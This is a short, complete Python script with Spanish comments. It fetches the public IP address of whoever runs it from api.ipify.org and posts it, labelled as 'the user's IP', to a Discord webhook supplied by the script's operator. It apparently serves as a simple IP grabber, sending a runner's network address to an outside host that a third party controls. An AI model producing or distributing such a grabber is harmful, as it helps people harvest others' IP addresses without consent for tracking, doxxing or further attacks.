import requests

def get_public_ip():
    try:
        response = requests.get('https://api.ipify.org?format=json')
        ip = response.json()['ip']
        return ip
    except Exception as e:
        print(f"Error al obtener la IP: {e}")
        return None

def send_ip_to_discord(ip, webhook_url):
    if ip:
        data = {
            "content": f"La IP del usuario es: **{ip}**"
        }
        try:
            response = requests.post(webhook_url, json=data)
            if response.status_code == 204:
                print("IP enviada exitosamente al webhook de Discord.")
            else:
                print(f"Error al enviar la IP al webhook: {response.status_code}, {response.text}")
        except Exception as e:
            print(f"Error al enviar la IP: {e}")
    else:
        print("No se pudo obtener la IP.")

if __name__ == "__main__":
    webhook_url = "ENLACE DE TU WEBHOOK" #INTRODUCE EL ENLACE DE TU WEBHOOK DE DISCORD
    ip = get_public_ip()
    send_ip_to_discord(ip, webhook_url)